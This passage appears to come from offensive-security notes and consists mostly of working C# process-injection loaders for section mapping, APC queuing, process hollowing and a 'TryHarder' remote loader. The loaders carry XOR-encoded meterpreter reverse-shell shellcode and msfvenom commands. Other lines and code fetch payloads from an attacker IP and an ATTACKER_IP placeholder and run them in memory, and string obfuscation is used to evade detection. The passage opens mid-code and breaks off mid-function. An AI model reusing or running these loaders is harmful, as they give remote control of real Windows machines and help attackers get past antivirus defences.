            byte[] bufx64 = new byte[511] { 0x06, 0xB2, 0x79, 0x1E, 0x0A, 0x12, 0x36, 0xFA, 0xFA, 0xFA, 0xBB, 0xAB, 0xBB, 0xAA, 0xA8, 0xAB, 0xAC, 0xB2, 0xCB, 0x28, 0x9F, 0xB2, 0x71, 0xA8, 0x9A, 0xB2, 0x71, 0xA8, 0xE2, 0xB2, 0x71, 0xA8, 0xDA, 0xB2, 0x71, 0x88, 0xAA, 0xB2, 0xF5, 0x4D, 0xB0, 0xB0, 0xB7, 0xCB, 0x33, 0xB2, 0xCB, 0x3A, 0x56, 0xC6, 0x9B, 0x86, 0xF8, 0xD6, 0xDA, 0xBB, 0x3B, 0x33, 0xF7, 0xBB, 0xFB, 0x3B, 0x18, 0x17, 0xA8, 0xBB, 0xAB, 0xB2, 0x71, 0xA8, 0xDA, 0x71, 0xB8, 0xC6, 0xB2, 0xFB, 0x2A, 0x9C, 0x7B, 0x82, 0xE2, 0xF1, 0xF8, 0xF5, 0x7F, 0x88, 0xFA, 0xFA, 0xFA, 0x71, 0x7A, 0x72, 0xFA, 0xFA, 0xFA, 0xB2, 0x7F, 0x3A, 0x8E, 0x9D, 0xB2, 0xFB, 0x2A, 0xAA, 0xBE, 0x71, 0xBA, 0xDA, 0xB3, 0xFB, 0x2A, 0x71, 0xB2, 0xE2, 0x19, 0xAC, 0xB2, 0x05, 0x33, 0xBB, 0x71, 0xCE, 0x72, 0xB2, 0xFB, 0x2C, 0xB7, 0xCB, 0x33, 0xB2, 0xCB, 0x3A, 0x56, 0xBB, 0x3B, 0x33, 0xF7, 0xBB, 0xFB, 0x3B, 0xC2, 0x1A, 0x8F, 0x0B, 0xB6, 0xF9, 0xB6, 0xDE, 0xF2, 0xBF, 0xC3, 0x2B, 0x8F, 0x22, 0xA2, 0xBE, 0x71, 0xBA, 0xDE, 0xB3, 0xFB, 0x2A, 0x9C, 0xBB, 0x71, 0xF6, 0xB2, 0xBE, 0x71, 0xBA, 0xE6, 0xB3, 0xFB, 0x2A, 0xBB, 0x71, 0xFE, 0x72, 0xBB, 0xA2, 0xBB, 0xA2, 0xA4, 0xB2, 0xFB, 0x2A, 0xA3, 0xA0, 0xBB, 0xA2, 0xBB, 0xA3, 0xBB, 0xA0, 0xB2, 0x79, 0x16, 0xDA, 0xBB, 0xA8, 0x05, 0x1A, 0xA2, 0xBB, 0xA3, 0xA0, 0xB2, 0x71, 0xE8, 0x13, 0xB1, 0x05, 0x05, 0x05, 0xA7, 0xB3, 0x44, 0x8D, 0x89, 0xC8, 0xA5, 0xC9, 0xC8, 0xFA, 0xFA, 0xBB, 0xAC, 0xB3, 0x73, 0x1C, 0xB2, 0x7B, 0x16, 0x5A, 0xFB, 0xFA, 0xFA, 0xB3, 0x73, 0x1F, 0xB3, 0x46, 0xF8, 0xFA, 0xFB, 0x41, 0x3A, 0x52, 0xD7, 0x39, 0xBB, 0xAE, 0xB3, 0x73, 0x1E, 0xB6, 0x73, 0x0B, 0xBB, 0x40, 0xB6, 0x8D, 0xDC, 0xFD, 0x05, 0x2F, 0xB6, 0x73, 0x10, 0x92, 0xFB, 0xFB, 0xFA, 0xFA, 0xA3, 0xBB, 0x40, 0xD3, 0x7A, 0x91, 0xFA, 0x05, 0x2F, 0x90, 0xF0, 0xBB, 0xA4, 0xAA, 0xAA, 0xB7, 0xCB, 0x33, 0xB7, 0xCB, 0x3A, 0xB2, 0x05, 0x3A, 0xB2, 0x73, 0x38, 0xB2, 0x05, 0x3A, 0xB2, 0x73, 0x3B, 0xBB, 0x40, 0x10, 0xF5, 0x25, 0x1A, 0x05, 0x2F, 0xB2, 0x73, 0x3D, 0x90, 0xEA, 0xBB, 0xA2, 0xB6, 0x73, 0x18, 0xB2, 0x73, 0x03, 0xBB, 0x40, 0x63, 0x5F, 0x8E, 0x9B, 0x05, 0x2F, 0x7F, 0x3A, 0x8E, 0xF0, 0xB3, 0x05, 0x34, 0x8F, 0x1F, 0x12, 0x69, 0xFA, 0xFA, 0xFA, 0xB2, 0x79, 0x16, 0xEA, 0xB2, 0x73, 0x18, 0xB7, 0xCB, 0x33, 0x90, 0xFE, 0xBB, 0xA2, 0xB2, 0x73, 0x03, 0xBB, 0x40, 0xF8, 0x23, 0x32, 0xA5, 0x05, 0x2F, 0x79, 0x02, 0xFA, 0x84, 0xAF, 0xB2, 0x79, 0x3E, 0xDA, 0xA4, 0x73, 0x0C, 0x90, 0xBA, 0xBB, 0xA3, 0x92, 0xFA, 0xEA, 0xFA, 0xFA, 0xBB, 0xA2, 0xB2, 0x73, 0x08, 0xB2, 0xCB, 0x33, 0xBB, 0x40, 0xA2, 0x5E, 0xA9, 0x1F, 0x05, 0x2F, 0xB2, 0x73, 0x39, 0xB3, 0x73, 0x3D, 0xB7, 0xCB, 0x33, 0xB3, 0x73, 0x0A, 0xB2, 0x73, 0x20, 0xB2, 0x73, 0x03, 0xBB, 0x40, 0xF8, 0x23, 0x32, 0xA5, 0x05, 0x2F, 0x79, 0x02, 0xFA, 0x87, 0xD2, 0xA2, 0xBB, 0xAD, 0xA3, 0x92, 0xFA, 0xBA, 0xFA, 0xFA, 0xBB, 0xA2, 0x90, 0xFA, 0xA0, 0xBB, 0x40, 0xF1, 0xD5, 0xF5, 0xCA, 0x05, 0x2F, 0xAD, 0xA3, 0xBB, 0x40, 0x8F, 0x94, 0xB7, 0x9B, 0x05, 0x2F, 0xB3, 0x05, 0x34, 0x13, 0xC6, 0x05, 0x05, 0x05, 0xB2, 0xFB, 0x39, 0xB2, 0xD3, 0x3C, 0xB2, 0x7F, 0x0C, 0x8F, 0x4E, 0xBB, 0x05, 0x1D, 0xA2, 0x90, 0xFA, 0xA3, 0x41, 0x1A, 0xE7, 0xD0, 0xF0, 0xBB, 0x73, 0x20, 0x05, 0x2F };

            buf = bufx64;

            int len = buf.Length;
            uint bufferLength = (uint)len;

            // Decode the payload
            for (int j = 0; j < bufx64.Length; j++)
            {
                bufx64[j] = (byte)((uint)bufx64[j] ^ 0xfa);
            }

            IntPtr sectionHandler = new IntPtr();

            long createSection = (int)NtCreateSection(ref sectionHandler, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, IntPtr.Zero, ref bufferLength, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);

            IntPtr localBaseAddress = new IntPtr();
            int sizeLocal = 4096;
            ulong offsetSectionLocal = new ulong();

            long mapSectionLocal = NtMapViewOfSection(sectionHandler, hlocalProcess, ref localBaseAddress, IntPtr.Zero, IntPtr.Zero, out offsetSectionLocal, out sizeLocal, 2, 0, PAGE_READWRITE);

            var localBaseAddrString = string.Format("{0:X}", localBaseAddress);
            UInt64 localBaseAddrInt = UInt64.Parse(localBaseAddrString);
            string localBaseAddHex = localBaseAddrInt.ToString("x");

            IntPtr remoteBaseAddress = new IntPtr();
            int sizeRemote = 4096;
            ulong offsetSectionRemote = new ulong();
            long mapSectionRemote = NtMapViewOfSection(sectionHandler, hremoteProcess, ref remoteBaseAddress, IntPtr.Zero, IntPtr.Zero, out offsetSectionRemote, out sizeRemote, 2, 0, PAGE_READEXECUTE);

            var remoteBaseAddrString = string.Format("{0:X}", remoteBaseAddress);
            UInt64 remoteBaseAddrInt = UInt64.Parse(remoteBaseAddrString);
            string remoteBaseAddHex = remoteBaseAddrInt.ToString("x");

            Marshal.Copy(buf, 0, localBaseAddress, buf.Length);

            unsafe
            {
                fixed (byte* p = &buf[0])
                {
                    byte* p2 = p;
                    var bufString = string.Format("{0:X}", new IntPtr(p2));
                    UInt64 bufInt = UInt64.Parse(bufString);
                    string bufHex = bufInt.ToString("x");

                }
            }

            List<int> threadList = new List<int>();
            ProcessThreadCollection threadsBefore = Process.GetProcessById(targetProcess[0].Id).Threads;
            foreach (ProcessThread thread in threadsBefore)
            {
                threadList.Add(thread.Id);
            }

            IntPtr hRemoteThread;

            uint hThread = NtCreateThreadEx(out hRemoteThread, 0x1FFFFF, IntPtr.Zero, hremoteProcess, remoteBaseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);

            ProcessThreadCollection threads = Process.GetProcessById(targetProcess[0].Id).Threads;

            uint unmapStatus = NtUnmapViewOfSection(hlocalProcess, localBaseAddress);

            int SectionStatus = NtClose(sectionHandler);
        }

        private static IntPtr NtOpenProcess(int id, int v, object value)
        {
            throw new NotImplementedException();
        }
    }
}

```

### **NtQueueApc**

**Explanation** This method uses Asynchronous Procedure Calls (APCs) to queue execution of shellcode in the context of a thread in a remote process. It is often used in combination with other techniques to delay execution or avoid detection.

**High-Level Steps:**

1. Create a new process in a suspended state using `CreateProcess` with the CREATE_SUSPENDED flag.
2. Allocate memory in the target process with `NtAllocateVirtualMemory`.
3. Write the shellcode into the allocated memory using `NtWriteVirtualMemory`.
4. Queue the shellcode for execution in the suspended thread using `NtQueueApcThread`.
5. Resume the main thread using `NtResumeThread` to trigger the APC and execute the payload.

**Code**

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ProcessCreateAndInject
{
    class Program
    {
        // Constants
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint THREAD_ALL_ACCESS = 0x1F03FF;
        private const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
        private const uint CREATE_SUSPENDED = 0x00000004;

        // Structs
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        // Imports
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll")]
        private static extern uint NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            uint AllocationType,
            uint Protect);

        [DllImport("ntdll.dll")]
        private static extern uint NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            byte[] Buffer,
            uint BufferLength,
            out uint BytesWritten);

        [DllImport("ntdll.dll")]
        private static extern uint NtQueueApcThread(
            IntPtr ThreadHandle,
            IntPtr ApcRoutine,
            IntPtr ApcArgument1,
            IntPtr ApcArgument2,
            IntPtr ApcArgument3);

        [DllImport("ntdll.dll")]
        private static extern uint NtResumeThread(
            IntPtr ThreadHandle,
            out uint PreviousSuspendCount);

        static void Main(string[] args)
        {
            try
            {
                // Configuration - change these as needed
                string targetProcess = @"C:\Windows\System32\notepad.exe";

                // Generate: msfvenom -p windows/x64/meterpreter/reverse_tcp exitfunc=thread LHOST=eth0 LPORT=443 -f csharp
                // The shellcode XOR'd with key: 0xfa
                byte[] shellcode = new byte[511] { 0x06, 0xB2, 0x79, 0x1E, 0x0A, 0x12, 0x36, 0xFA, 0xFA, 0xFA, 0xBB, 0xAB, 0xBB, 0xAA, 0xA8, 0xAB, 0xAC, 0xB2, 0xCB, 0x28, 0x9F, 0xB2, 0x71, 0xA8, 0x9A, 0xB2, 0x71, 0xA8, 0xE2, 0xB2, 0x71, 0xA8, 0xDA, 0xB2, 0xF5, 0x4D, 0xB0, 0xB0, 0xB2, 0x71, 0x88, 0xAA, 0xB7, 0xCB, 0x33, 0xB2, 0xCB, 0x3A, 0x56, 0xC6, 0x9B, 0x86, 0xF8, 0xD6, 0xDA, 0xBB, 0x3B, 0x33, 0xF7, 0xBB, 0xFB, 0x3B, 0x18, 0x17, 0xA8, 0xB2, 0x71, 0xA8, 0xDA, 0x71, 0xB8, 0xC6, 0xB2, 0xFB, 0x2A, 0x9C, 0x7B, 0x82, 0xE2, 0xF1, 0xF8, 0xBB, 0xAB, 0xF5, 0x7F, 0x88, 0xFA, 0xFA, 0xFA, 0x71, 0x7A, 0x72, 0xFA, 0xFA, 0xFA, 0xB2, 0x7F, 0x3A, 0x8E, 0x9D, 0xB2, 0xFB, 0x2A, 0xBE, 0x71, 0xBA, 0xDA, 0xAA, 0xB3, 0xFB, 0x2A, 0x71, 0xB2, 0xE2, 0x19, 0xAC, 0xB7, 0xCB, 0x33, 0xB2, 0x05, 0x33, 0xBB, 0x71, 0xCE, 0x72, 0xB2, 0xFB, 0x2C, 0xB2, 0xCB, 0x3A, 0x56, 0xBB, 0x3B, 0x33, 0xF7, 0xBB, 0xFB, 0x3B, 0xC2, 0x1A, 0x8F, 0x0B, 0xB6, 0xF9, 0xB6, 0xDE, 0xF2, 0xBF, 0xC3, 0x2B, 0x8F, 0x22, 0xA2, 0xBE, 0x71, 0xBA, 0xDE, 0xB3, 0xFB, 0x2A, 0x9C, 0xBB, 0x71, 0xF6, 0xB2, 0xBE, 0x71, 0xBA, 0xE6, 0xB3, 0xFB, 0x2A, 0xBB, 0x71, 0xFE, 0x72, 0xBB, 0xA2, 0xB2, 0xFB, 0x2A, 0xBB, 0xA2, 0xA4, 0xA3, 0xA0, 0xBB, 0xA2, 0xBB, 0xA3, 0xBB, 0xA0, 0xB2, 0x79, 0x16, 0xDA, 0xBB, 0xA8, 0x05, 0x1A, 0xA2, 0xBB, 0xA3, 0xA0, 0xB2, 0x71, 0xE8, 0x13, 0xB1, 0x05, 0x05, 0x05, 0xA7, 0xB3, 0x44, 0x8D, 0x89, 0xC8, 0xA5, 0xC9, 0xC8, 0xFA, 0xFA, 0xBB, 0xAC, 0xB3, 0x73, 0x1C, 0xB2, 0x7B, 0x16, 0x5A, 0xFB, 0xFA, 0xFA, 0xB3, 0x73, 0x1F, 0xB3, 0x46, 0xF8, 0xFA, 0xFB, 0x41, 0x3A, 0x52, 0xE3, 0xEC, 0xBB, 0xAE, 0xB3, 0x73, 0x1E, 0xB6, 0x73, 0x0B, 0xBB, 0x40, 0xB6, 0x8D, 0xDC, 0xFD, 0x05, 0x2F, 0xB6, 0x73, 0x10, 0x92, 0xFB, 0xFB, 0xFA, 0xFA, 0xA3, 0xBB, 0x40, 0xD3, 0x7A, 0x91, 0xFA, 0x05, 0x2F, 0x90, 0xF0, 0xBB, 0xA4, 0xAA, 0xAA, 0xB7, 0xCB, 0x33, 0xB7, 0xCB, 0x3A, 0xB2, 0x05, 0x3A, 0xB2, 0x73, 0x38, 0xB2, 0x05, 0x3A, 0xB2, 0x73, 0x3B, 0xBB, 0x40, 0x10, 0xF5, 0x25, 0x1A, 0x05, 0x2F, 0xB2, 0x73, 0x3D, 0x90, 0xEA, 0xBB, 0xA2, 0xB6, 0x73, 0x18, 0xB2, 0x73, 0x03, 0xBB, 0x40, 0x63, 0x5F, 0x8E, 0x9B, 0x05, 0x2F, 0x7F, 0x3A, 0x8E, 0xF0, 0xB3, 0x05, 0x34, 0x8F, 0x1F, 0x12, 0x69, 0xFA, 0xFA, 0xFA, 0xB2, 0x79, 0x16, 0xEA, 0xB2, 0x73, 0x18, 0xB7, 0xCB, 0x33, 0x90, 0xFE, 0xBB, 0xA2, 0xB2, 0x73, 0x03, 0xBB, 0x40, 0xF8, 0x23, 0x32, 0xA5, 0x05, 0x2F, 0x79, 0x02, 0xFA, 0x84, 0xAF, 0xB2, 0x79, 0x3E, 0xDA, 0xA4, 0x73, 0x0C, 0x90, 0xBA, 0xBB, 0xA3, 0x92, 0xFA, 0xEA, 0xFA, 0xFA, 0xBB, 0xA2, 0xB2, 0x73, 0x08, 0xB2, 0xCB, 0x33, 0xBB, 0x40, 0xA2, 0x5E, 0xA9, 0x1F, 0x05, 0x2F, 0xB2, 0x73, 0x39, 0xB3, 0x73, 0x3D, 0xB7, 0xCB, 0x33, 0xB3, 0x73, 0x0A, 0xB2, 0x73, 0x20, 0xB2, 0x73, 0x03, 0xBB, 0x40, 0xF8, 0x23, 0x32, 0xA5, 0x05, 0x2F, 0x79, 0x02, 0xFA, 0x87, 0xD2, 0xA2, 0xBB, 0xAD, 0xA3, 0x92, 0xFA, 0xBA, 0xFA, 0xFA, 0xBB, 0xA2, 0x90, 0xFA, 0xA0, 0xBB, 0x40, 0xF1, 0xD5, 0xF5, 0xCA, 0x05, 0x2F, 0xAD, 0xA3, 0xBB, 0x40, 0x8F, 0x94, 0xB7, 0x9B, 0x05, 0x2F, 0xB3, 0x05, 0x34, 0x13, 0xC6, 0x05, 0x05, 0x05, 0xB2, 0xFB, 0x39, 0xB2, 0xD3, 0x3C, 0xB2, 0x7F, 0x0C, 0x8F, 0x4E, 0xBB, 0x05, 0x1D, 0xA2, 0x90, 0xFA, 0xA3, 0x41, 0x1A, 0xE7, 0xD0, 0xF0, 0xBB, 0x73, 0x20, 0x05, 0x2F };

                // Create suspended process
                var pi = CreateSuspendedProcess(targetProcess);
                Console.WriteLine($"[+] Created process PID: {pi.dwProcessId}");

                for (int j = 0; j < shellcode.Length; j++)
                {
                    shellcode[j] = (byte)((uint)shellcode[j] ^ 0xfa);
                }

                // Allocate memory in target process
                IntPtr shellcodeAddr = AllocateMemory(pi.hProcess, shellcode.Length);
                Console.WriteLine($"[+] Allocated memory at: 0x{shellcodeAddr.ToInt64():X}");

                // Write shellcode to target process
                WriteMemory(pi.hProcess, shellcodeAddr, shellcode);
                Console.WriteLine("[+] Shellcode written");

                // Queue APC to main thread
                QueueAPC(pi.hThread, shellcodeAddr);
                Console.WriteLine("[+] APC queued to main thread");

                // Resume thread to execute shellcode
                ResumeThread(pi.hThread);
                Console.WriteLine("[+] Thread resumed");

                Console.WriteLine("[!] Injection complete!");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
            }
        }

        static PROCESS_INFORMATION CreateSuspendedProcess(string processPath)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi;

            bool success = CreateProcess(
                processPath,
                null,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                CREATE_SUSPENDED,
                IntPtr.Zero,
                null,
                ref si,
                out pi);

            if (!success)
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());

            return pi;
        }

        static IntPtr AllocateMemory(IntPtr hProcess, int size)
        {
            IntPtr baseAddr = IntPtr.Zero;
            IntPtr regionSize = new IntPtr(size);
            uint status = (uint)NtAllocateVirtualMemory(
                hProcess,
                ref baseAddr,
                IntPtr.Zero,
                ref regionSize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);

            if (status != 0)
                throw new Exception($"Memory allocation failed (0x{status:X8})");

            return baseAddr;
        }

        static void WriteMemory(IntPtr hProcess, IntPtr address, byte[] data)
        {
            uint status = NtWriteVirtualMemory(
                hProcess,
                address,
                data,
                (uint)data.Length,
                out _);

            if (status != 0)
                throw new Exception($"Memory write failed (0x{status:X8})");
        }

        static void QueueAPC(IntPtr hThread, IntPtr shellcodeAddr)
        {
            uint status = NtQueueApcThread(
                hThread,
                shellcodeAddr,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero);

            if (status != 0)
                throw new Exception($"APC queue failed (0x{status:X8})");
        }

        static void ResumeThread(IntPtr hThread)
        {
            uint status = NtResumeThread(hThread, out _);
            if (status != 0)
                throw new Exception($"Thread resume failed (0x{status:X8})");
        }
    }
}

```

### **Process Hollow**

**Explanation** An advanced injection technique where a legitimate process is started in a suspended state, its memory is unmapped, and malicious code is written into it—effectively "hollowing out" the original process. The thread is then resumed, executing the injected payload under the guise of a legitimate executable.

**High-Level Steps:**

1. Create a target process (e.g., svchost.exe) in a suspended state using CreateProcess with CREATE_SUSPENDED.
2. Retrieve the base address of the main module using NtQueryInformationProcess and ReadProcessMemory.
3. Unmap the memory of the original executable using NtUnmapViewOfSection.
4. Allocate memory in the remote process using VirtualAllocEx.
5. Write the malicious executable (often a PE file) into the allocated memory using WriteProcessMemory.
6. Update the remote process's context (entry point) with SetThreadContext.
7. Resume the main thread with ResumeThread to execute the injected payload.

**Code**

```csharp
using System;
using System.Runtime.InteropServices;
class Program
{
    // Define necessary structures
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr ExitStatus;
        public IntPtr PebAddress;
        public IntPtr AffinityMask;
        public IntPtr BasePriority;
        public IntPtr UniqueProcessId;
        public IntPtr InheritedFromUniqueProcessId;
    }

    // Constants
    const uint CREATE_SUSPENDED = 0x00000004;
    const int ProcessBasicInformation = 0;

    // Function declarations
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );

    [DllImport("ntdll.dll")]
    static extern int NtQueryInformationProcess(
        IntPtr hProcess,
        int processInformationClass,
        ref PROCESS_BASIC_INFORMATION processInformation,
        uint processInformationLength,
        ref uint returnLength
    );

    [DllImport("ntdll.dll")]
    static extern int NtReadVirtualMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int NumberOfBytesToRead,
        out IntPtr lpNumberOfBytesRead
    );

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int NumberOfBytesToWrite,
        out IntPtr lpNumberOfBytesWritten
    );

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern bool NtResumeProcess(IntPtr hThread);

    static void Main()
    {

        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

        // Create process in suspended state
        bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);

        PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
        uint tmp = 0;
        IntPtr hProcess = pi.hProcess;

        NtQueryInformationProcess(hProcess, ProcessBasicInformation, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

        IntPtr ptrImageBaseAddress = (IntPtr)((Int64)bi.PebAddress + 0x10);

        byte[] baseAddressBytes = new byte[IntPtr.Size];
        IntPtr nRead;
        NtReadVirtualMemory(hProcess, ptrImageBaseAddress, baseAddressBytes, baseAddressBytes.Length, out nRead);
        IntPtr imageBaseAddress = (IntPtr)(BitConverter.ToInt64(baseAddressBytes, 0));

        byte[] data = new byte[0x200];
        NtReadVirtualMemory(hProcess, imageBaseAddress, data, data.Length, out nRead);

        uint e_lfanew = BitConverter.ToUInt32(data, 0x3C);
        uint entrypointRvaOffset = e_lfanew + 0x28;
        uint entrypointRva = BitConverter.ToUInt32(data, (int)entrypointRvaOffset);

        IntPtr entrypointAddress = (IntPtr)((UInt64)imageBaseAddress + entrypointRva);

        // Step 6: Generate: msfvenom -p windows/x64/meterpreter/reverse_tcp exitfunc=thread LHOST=ens33 LPORT=443 -f csharp
        // Shellcode XOR'd with key: 0xfa
        byte[] buf = new byte[511] { 0x06, 0xB2...};

        for (int i = 0; i < buf.Length; i++)
        {
            buf[i] = (byte)((uint)buf[i] ^ 0xfa);
        }

        WriteProcessMemory(hProcess, entrypointAddress, buf, buf.Length, out nRead);

        // Step 8: Resume the thread to execute the shellcode
        NtResumeProcess(pi.hProcess);
        Console.WriteLine("Boom! Check your listener.");

    }
}

```

### **TryHarder**

**Explanation** Another Process Injection technique that loads the shellcode remotely. The idea of this technique is by `Sektor 7` and ported to C# by [saulgoodman](https://github.com/saulg00dmin).

**Steps**

1. Create Shellcode using msfvenom:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f raw EXITFUNC=thread -o shellcode.bin

```

1. Serve the `shellcode.bin` with a Python Server, and download it by converting the `.exe` into a byte array

```powershell
python3 -m http.server 80

$data = (New-Object System.Net.WebClient).DownloadData('http://[ATTACKER_IP]/Tryharder.exe')

```

1. Load the EXE into memory

```powershell
$assem = [System.Reflection.Assembly]::Load($data)

```

1. Invoke its entry point:

```powershell
$assem.EntryPoint.Invoke($null, @([string[]]@()))

```

**Code**

```csharp
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

class Program
{
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [DllImport("kernel32.dll")]
    private static extern bool ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    private static string DecryptString(byte[] encryptedData)
    {
        return Encoding.UTF8.GetString(encryptedData);
    }

    private static readonly byte[] encCreateProcess = { 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x41, 0x00 };
    private static readonly byte[] encWriteProcessMemory = { 0x57, 0x72, 0x69, 0x74, 0x65, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x00 };
    private static readonly byte[] encVirtualAllocEx = { 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x45, 0x78, 0x00 };

    private delegate bool WriteProcessMemoryFunc(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    private static readonly WriteProcessMemoryFunc pwProcmem = (WriteProcessMemoryFunc)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptString(encWriteProcessMemory)), typeof(WriteProcessMemoryFunc));

    private delegate bool CreateProcessAFunc(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    private static readonly CreateProcessAFunc pwCreateProcess = (CreateProcessAFunc)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptString(encCreateProcess)), typeof(CreateProcessAFunc));

    private delegate IntPtr VirtualAllocExFunc(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    private static readonly VirtualAllocExFunc pwVirtualAllocEx = (VirtualAllocExFunc)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptString(encVirtualAllocEx)), typeof(VirtualAllocExFunc));

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    static void Main()
    {
        Thread.Sleep(10000);

        string url = "http://192.168.45.207/shellcode.bin";
        byte[] payload = new WebClient().DownloadData(url);

        STARTUPINFO si = new STARTUPINFO();
